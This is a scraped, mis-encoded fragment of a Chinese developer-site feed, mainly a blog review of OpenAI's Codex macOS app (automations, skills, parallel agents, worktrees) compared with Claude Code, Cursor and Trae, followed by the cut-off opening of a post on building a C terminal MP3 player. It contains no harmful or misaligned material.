code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â–²ç‚¹å‡»æ˜Ÿæ ‡â­ï¸ï¼ŒåŠæ—¶æ”¶çœ‹æ›´å¤šAIå®æˆ˜</p>
<h2 data-id="heading-0">01 AIç¼–ç¨‹çš„æŒ‘æˆ˜å˜äº†</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80b5610c71994a74b3ae0cdc7b08b4f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=GVA1Y0m46dJP9d5GnIXMhm%2FMbXw%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>The core challenge has shifted from what agents can do to how people can direct, supervise, and collaborate with them at scale.</p>
<p>OpenAI</p>
</blockquote>
<p>å‰å¤©æ™šä¸Šï¼ŒOpen AI å‘å¸ƒäº†Codex macOSåº”ç”¨ï¼Œå®ƒè¯´AIç¼–ç¨‹çš„æ ¸å¿ƒæŒ‘æˆ˜å·²ç»è½¬ç§»äº†ï¼Œå®ƒä»AIèƒ½åšä»€ä¹ˆå˜æˆäº†äººä»¬å¦‚ä½•å¤§è§„æ¨¡çš„æŒ‡æŒ¥ã€ç›‘ç£å’Œä¸AIåä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31eed34b7e74425d89c039003f7a5cf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=3wUo53gk%2FuGdrsw6sIoGnwjHuQ8%3D" alt="" loading="lazy"/></p>
<p>å…¶å®Codexæœ¬èº«ä¹Ÿæœ‰ç»ˆç«¯çš„ç‰ˆæœ¬ï¼Œæ¯æ¬¡æˆ‘é‡åˆ°äº†å¤æ‚é—®é¢˜çš„æ—¶å€™æˆ‘éƒ½ä¼šç”¨å®ƒï¼Œé™¤äº†20åˆ€çš„ç”¨é‡å¤ªå°‘ä¹‹å¤–è¿˜æ˜¯éå¸¸å¥½ç”¨å¾—åˆ°ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯Codex macOSåº”ç”¨æƒ³è¦è§£å†³çš„é—®é¢˜ï¼Œå®ƒè¿™æ¬¡é¡ºå¸¦å‡çº§äº†è‡ªå·±çš„äº§å“å®šä½ï¼šä¸€ä¸ªä¸ºä»£ç†è®¾è®¡çš„æŒ‡æŒ¥ä¸­å¿ƒ</p>
<h2 data-id="heading-1">02 Codexè¿™ä¸€æ¬¡çš„å‡çº§çªç ´</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e80050045a91498a925c7666c78fa9c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=GXuP7yVbiXddhVXeMDlqVW4tAPE%3D" alt="" loading="lazy"/></p>
<p>å·¦è¾¹çš„å›¾ç‰‡æ˜¯Macçš„æ¡Œè¾¹ç«¯ï¼Œå³è¾¹æ˜¯ä¼ ç»Ÿçš„ç»ˆç«¯ã€‚ä»ç¬¬ä¸€ä¸ªé¡µé¢çœ‹ï¼Œæ¡Œé¢ç«¯ä¼šæŠŠä»»åŠ¡æ”¾åœ¨æ›´å‰ä¾§ã€‚</p>
<h3 data-id="heading-2">Automations å®šæ—¶ä»»åŠ¡</h3>
<p>æ¯æ—¥Issueåˆ†ç±»ã€CIå¤±è´¥æ€»ç»“ã€å‘å¸ƒç®€æŠ¥ç”Ÿæˆã€Bugè‡ªåŠ¨æ£€æŸ¥ï¼Œè¿™äº›ä»»åŠ¡å¯ä»¥è®¾å®šå®šæ—¶è‡ªåŠ¨è¿è¡Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2144377d74464e61b349e074cd8d0b76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=Rm10sC9k79jZ30jFjJc5N3Yi%2FVw%3D" alt="" loading="lazy"/></p>
<p>ç¬¬ä¸€ä¸ªæ˜¯ç¼–ç¨‹å°ç™½å…¥é—¨å¿…å¤‡çš„å°æ¸¸æˆï¼Œç„¶åæ˜¯ä¿®å¤BUGã€åšåŠŸèƒ½è§„åˆ’ã€ç”»åŸå‹ï¼Œç”šè‡³umm...</p>
<p>æœ€åä¸€ä¸ªè¿˜èƒ½ç»™è‡ªå·±5å²çš„å°å­©è®²ä¸ªå…³äºä½ æ¶æ„ç¡å‰æ•…äº‹ã€‚</p>
<p>æ²¡é”™ï¼Œä¸‡ç‰©çš†å¯Vibe Codingã€‚</p>
<h3 data-id="heading-3">Skills æ‰©å±•ç³»ç»Ÿ</h3>
<p>å®˜æ–¹æŠ€èƒ½åº“åŒ…æ‹¬Figmaï¼ˆè®¾è®¡ç¨¿è½¬ä»£ç ï¼‰ã€Linearï¼ˆBugåˆ†ç±»ï¼‰ã€Vercel/Cloudflare/Netlifyï¼ˆä¸€é”®éƒ¨ç½²ï¼‰ç­‰ã€‚å›¢é˜Ÿè¿˜å¯ä»¥è‡ªå®šä¹‰æŠ€èƒ½ï¼Œåœ¨Appã€CLIã€IDEæ‰©å±•é—´é€šç”¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85f06dc9f515478a977ab0256738f93f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=qiUoYb7D11VzJbHJ6W9FwUvizuw%3D" alt="" loading="lazy"/>ç¬¬äºŒä¸ªæ¯”è¾ƒå¤§çš„å·®å¼‚æ˜¯ï¼šSkillsçš„ä¼˜å…ˆçº§è¢«æ‹‰åˆ°æ— é™é«˜ï¼Œé™¤äº†æ›´å¿«çš„å¸®åŠ©ä½ æ‰¾Skillsï¼Œä¹Ÿä¼šç»™ä½ æ¨èæ›´å¤šçš„Skillsã€‚</p>
<p>æ²¡çŒœé”™çš„è¯åº”è¯¥æ˜¯ä¸ªæ€§åŒ–çš„ï¼Œä¼šåŸºäºä½ å¤§çš„ä¸Šä¸‹æ–‡ä½ æ—¥å¸¸çš„ä½¿ç”¨ç»™ä½ æ¨èSkills</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/598b98e2fe0144169c42b54f0d32a5b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=SdRVApETCZpX%2FKzLjkU%2Bz9LkLzo%3D" alt="" loading="lazy"/>è€Œè¿™é‡Œæ¨èçš„ç¬¬ä¸€æ³¢å…¶å®æ˜¯OpenAIå¤§ç¤¼åŒ…ï¼Œçœ‹åˆ°Soraçš„æ—¶å€™å…¶å®å°±ä¸éš¾ç†è§£å‰é¢è¯´çš„ï¼ŒSkillsæ˜¯ä¸‡èƒ½çš„ï¼ŒVibeCodingä¹Ÿæ˜¯ä¸‡èƒ½çš„ã€‚</p>
<h3 data-id="heading-4">Multi-Agent å¹¶è¡Œç®¡ç†</h3>
<p>CLIæ—¶ä»£ï¼Œä½ ä¸€æ¬¡åªèƒ½å’Œä¸€ä¸ªagentå¯¹è¯ã€‚</p>
<p>ç°åœ¨ï¼Œä½ å¯ä»¥åŒæ—¶è¿è¡Œ5-10 ä¸ª agentï¼Œæ¯ä¸ªç‹¬ç«‹çº¿ç¨‹å¤„ç†ä¸åŒä»»åŠ¡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18cd02342a8c4d3594104346f4b6b54f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=JhD5C05pvV1T1vXuOqQ7XfxG%2BZ0%3D" alt="" loading="lazy"/>è¿™ä¹Ÿæ˜¯å¯¹æˆ‘æ¥è¯´æœ€å¤§çš„å˜åŒ–ï¼Œæˆ‘ä¸ç”¨å†å»ä¸ºå¤šä¸ªä»»åŠ¡åˆ†ç¥äº†ï¼Œä»¥å‰å¤šä¸ªé¡¹ç›®ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©å¼€å¤šä¸ªçª—å£ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20a779c6971a432a9b7e0466f104d27a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=DlKiwKEXmUohV7TE1c8lpuqpx8M%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯ä¸ªçª—å£å¯èƒ½æœ‰æ— æ•°çš„ä»»åŠ¡ï¼Œä½†...çœŸçš„å¾ˆéš¾ç®¡ç†ã€‚å¯ä»¥è¯´å®Œå…¨æ˜¯çª—å£ç®¡ç†é€ æˆäº†æˆ‘Tokenæ¶ˆè€—é‡ä¸èƒ½è¿›ä¸€æ­¥æ‹‰é«˜...</p>
<p>è¿™æ¬¡Code Xçš„æ¡Œé¢ç‰ˆè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>å¯èƒ½ä¹ æƒ¯äº†chatçš„ä½“éªŒï¼ŒTraeå’ŒCursorè¦è‡ªå·±é€‰ä¼šè¯ï¼Œè¿˜æ˜¯éå¸¸çš„ä¸é€‚åº”ã€‚</p>
<h3 data-id="heading-5">å…¶ä»–æ‰©å±•çš„å†…ç½®æ”¯&amp;ä½“éªŒä¼˜åŒ–</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9a94891f36f43928d5d90cdfdc5c601~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=73gcQIMH9EWQ7q6HCInSwKfF6tU%3D" alt="" loading="lazy"/></p>
<p>MCPã€Skillsã€Gitçš„worktreeï¼ŒåŸºæœ¬ä¸Šä»¥å‰æœ‰çš„éƒ½æœ‰ï¼ŒAgentå¯ä»¥åœ¨è‡ªå·±çš„worktreeé‡Œå·¥ä½œï¼Œäº’ä¸å¹²æ‰°ã€‚</p>
<p>å¦å¤–å°±æ˜¯ç»ˆäºæ”¯æŒäº†è¯¥æ­»çš„å¿«æ·æ‰“å¼€Planæ¨¡å¼ï¼Œé€Ÿåº¦åœ¨å®ƒå¼€å§‹ç»™æˆ‘æ›´å¤šåé¦ˆçš„æ—¶å€™ï¼Œå¼€å§‹æ²¡é‚£ä¹ˆæ…¢äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85db674c154e4b3ab7a2340bffad1dbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=WrnGjzEqzYT3iXcfbeqWxLI%2F4OY%3D" alt="" loading="lazy"/></p>
<p>æ¥è‡ªæˆ‘ç§‹ç¥çš„å›¾</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨å·¦è¾¹çœ‹åˆ°å®ƒå½“å‰çš„è¿›åº¦ï¼Œæ˜¯å¦ç­‰å¾…ä½ å†³ç­–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9ad6a36d8154862828966a8f64dde0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=eKd41kreDP6%2FpwfWb922ag4Yy24%3D" alt="" loading="lazy"/></p>
<p>æ¯”èµ·ä»¥å‰çº¯é è‚‰çœ¼å»CLIæ‰¾è¦æ–¹ä¾¿çš„å¤šï¼Œè¦çŸ¥é“å®é™…ä¸Šä½ è¿è¡Œçš„å¯èƒ½æ˜¯5ä¸ªç”šè‡³10ä¸ªç»ˆç«¯çª—å£ï¼Œè€Œä¸”ç»å¸¸å°±å¿˜è®°äº†ã€‚</p>
<h2 data-id="heading-6">03 å’Œç°æœ‰ç¼–ç¨‹å·¥å…·çš„å·®å¼‚ï¼Ÿ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6207303d96724617bf48e76a2610e824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=OP1c6R5uXCKgYMeXmS37g6smRAM%3D" alt="" loading="lazy"/></p>

























<table><thead><tr><th>æ ¸å¿ƒå·®å¼‚</th><th>Claude Code</th><th>Codex macOS App</th></tr></thead><tbody><tr><td>å¹¶è¡Œæ–¹å¼</td><td>å¤šä¼šè¯/å­ä»£ç†èƒ½å¹¶è¡Œï¼Œä½†æ›´å¤šé æ‰‹åŠ¨ç¼–æ’</td><td>åŸç”Ÿé¡¹ç›®-çº¿ç¨‹çš„ç•Œé¢ï¼Œå¤šçº¿ç¨‹å¹¶è¡Œæ›´é¡ºæ‰‹</td></tr><tr><td>å¯è§†åŒ–ç»„ç»‡</td><td>ä»¥ CLI ä¸ºä¸»ï¼Œç¼ºå°‘é¡¹ç›®çº¿ç¨‹è§†å›¾</td><td>æœ‰å¯è§†åŒ–æŒ‡æŒ¥ç•Œé¢ï¼ˆé¡¹ç›®ã€çº¿ç¨‹diff/reviewï¼‰</td></tr><tr><td>Worktree &amp; è‡ªåŠ¨åŒ–</td><td>worktree ä¸»è¦é  git æ‰‹åŠ¨ç®¡ç†</td><td>å†…ç½® worktree/Automations ç®¡ç†</td></tr></tbody></table>
<p>è¿™æ˜¯å’ŒClaude Codeç±»çš„CLIäº§å“å¯¹æ¯”ï¼Œç®€å•çš„è¯´ï¼Œæ²¡æœ‰å¯è§†åŒ–ï¼Œå¤šä¼šè¯ã€å­ä»£ç†å¾ˆéº»çƒ¦ï¼Œworktreeä¹Ÿè¦è‡ªå·±æ¥å¤„ç†ã€‚</p>




















<table><thead><tr><th>å·¥å…·</th><th>æ ¸å¿ƒå®šä½</th><th>é€‚åˆåœºæ™¯</th></tr></thead><tbody><tr><td><strong>Trae/Cursor</strong></td><td>AI-Nativeçš„IDESoloæ¨¡å¼å°ç™½å‹å¥½</td><td>ä»£ç å®¡æŸ¥é›¶åŸºç¡€å…¥é—¨</td></tr><tr><td><strong>Codex macOS App</strong></td><td>å¤šAgentå¹¶è¡Œ + Worktreeéš”ç¦»</td><td>å›¢é˜Ÿåä½œã€å¤æ‚ä»»åŠ¡æ‹†è§£</td></tr></tbody></table>
<p>å’ŒCursorã€Traeã€VsCodeè¿™ç±»æ¯”è¾ƒé‡åº¦çš„IDEçš„é€‰æ‹©ï¼Œå…¶å®å–å†³äºä½ çœ‹ä¸çœ‹AIäº§å‡ºçš„å†…å®¹ã€‚</p>
<p>å¯¹äºç ”å‘å¤§ä½¬è¦å®¡æŸ¥ä»£ç ï¼Œé‚£IDEæ˜¯åˆšéœ€ï¼Œä¸ªäººåœºæ™¯çš„è¯ï¼Œæˆ‘è‡ªå·±å¯èƒ½æ›´å¤šçš„æ˜¯çœ‹ç»™æˆ‘å†™çš„æç¤ºè¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98a499d7a0794965a7071cc604942539~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2q5pavV2lzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770774738&amp;x-signature=6nyI%2B%2BPREiyK5wuzj6lrDi0jMgk%3D" alt="" loading="lazy"/></p>
<p>æ•´ä½“æ¥è¯´ï¼ŒCodex Macç‰ˆå‘å¸ƒï¼Œå¦‚æœä½ åªç”¨GPTä¸”ç”¨é‡è¶³å¤Ÿï¼Œé‚£å…¶å®ä½ å¯ä»¥å¸è½½æ‰å¾ˆå¤šç»ˆç«¯å·¥å…·äº†ï¼Œè‡³å°‘Codex Appç‰ˆæœ¬å®Œå…¨è¦†ç›–äº†CLIç‰ˆæœ¬ã€‚</p>
<p>å¯¹äºAIç¼–ç¨‹æ¥è¯´ï¼Œå…¥é—¨é—¨æ§›é™ä½äº†ï¼Œå…·æœ‰äº†å¯è§†åŒ–çš„é¢æ¿ï¼Œè€Œä¸”å³ä½¿åœ¨ä¸ç†Ÿç»ƒçš„æƒ…å†µä¹Ÿå¯ä»¥æé«˜æ•ˆç‡ï¼Œç›´æ¥å¼€çª—å£è®©å¤šä¸ªä¼šè¯åŒæ—¶æ‰“å·¥å°±è¡Œäº†ã€‚</p>
<p>Codex macOS Appçš„å‘å¸ƒï¼Œæ ‡å¿—ç€AIç¼–ç¨‹ä»åªæ˜¯ä¸€ä¸ªdemoå·¥å…·é€æ­¥è½¬å‘ç”Ÿäº§çš„åŸºç¡€è®¾æ–½ã€‚</p>
<p>å½“å¤šAgentå¹¶è¡Œæˆä¸ºå¸¸æ€ï¼Œå½“Worktreeéš”ç¦»æˆä¸ºæ ‡é…ï¼Œè¿™ä¸æ˜¯ç¼–ç¨‹çš„æ¶ˆäº¡ï¼Œè€Œæ˜¯ç¼–ç¨‹çš„è¿›åŒ–ã€‚</p>
<p>å£°æ˜ï¼šéƒ¨åˆ†å›¾ç‰‡ä¸ºAIç”Ÿæˆ</p>
<blockquote>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fkckwd15MzWk9xWSVhCflTw" target="_blank" title="https://mp.weixin.qq.com/s/kckwd15MzWk9xWSVhCflTw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/kckwd15Mzâ€¦</a></p>
<p>å¦‚æœå¯¹æœ‹å‹ä»¬æœ‰ç”¨ï¼Œæ¬¢è¿å…³æ³¨å…¬ä¼—å·ï¼šæ­ªæ–¯Wise</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶æ‰“é€  Linux ç»ˆç«¯ MP3 æ’­æ”¾å™¨ï¼ç”¨ C è¯­è¨€å®ç°éŸ³ä¹è‡ªç”±]]></title>    <link>https://juejin.cn/post/7602455806446682118</link>    <guid>https://juejin.cn/post/7602455806446682118</guid>    <pubDate>2026-02-04T00:59:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446682118" data-draft-id="7602503154505842729" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶æ‰“é€  Linux ç»ˆç«¯ MP3 æ’­æ”¾å™¨ï¼ç”¨ C è¯­è¨€å®ç°éŸ³ä¹è‡ªç”±"/> <meta itemprop="keywords" content="Linux,Cè¯­è¨€,åç«¯"/> <meta itemprop="datePublished" content="2026-02-04T00:59:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ¨åŒå­¦66"/> <meta itemprop="url" content="https://juejin.cn/user/1189004976589664"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶æ‰“é€  Linux ç»ˆç«¯ MP3 æ’­æ”¾å™¨ï¼ç”¨ C è¯­è¨€å®ç°éŸ³ä¹è‡ªç”±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1189004976589664/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ¨åŒå­¦66
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:59:19.000Z" title="Wed Feb 04 2026 00:59:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Linux çš„ä¸–ç•Œé‡Œï¼Œå‘½ä»¤è¡Œæ°¸è¿œæ˜¯æœ€çº¯ç²¹ã€æœ€å¼ºå¤§çš„äº¤äº’æ–¹å¼ã€‚ä½ æ˜¯å¦æƒ³è¿‡äº²æ‰‹æ‰“é€ 